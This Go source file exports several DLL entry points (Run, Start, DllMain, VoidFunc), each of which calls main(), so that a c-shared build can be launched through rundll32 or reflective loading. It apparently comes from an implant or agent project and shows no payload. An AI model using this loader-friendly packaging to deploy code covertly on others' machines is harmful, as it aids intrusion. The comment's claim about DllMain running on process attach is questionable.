//go:build shared
// +build shared

package main

import "C"
import (
	"context"
)

// These exported functions are only compiled when building with -buildmode=c-shared

var (
	ctx    context.Context
	cancel context.CancelFunc
)

//export Run
func Run() {
	// Entry point for the DLL that can be called via rundll32 or reflective loading
	// This mirrors the main() function logic but is callable as an export
	main()
}

//export Start
func Start() {
	// Alternative entry point name
	main()
}

//export DllMain
func DllMain() {
	// Windows DLL entry point that gets called on DLL_PROCESS_ATTACH
	// Note: This may have limitations with Go runtime initialization
	main()
}

//export VoidFunc
func VoidFunc() {
	// Generic export that some loaders expect
	main()
}
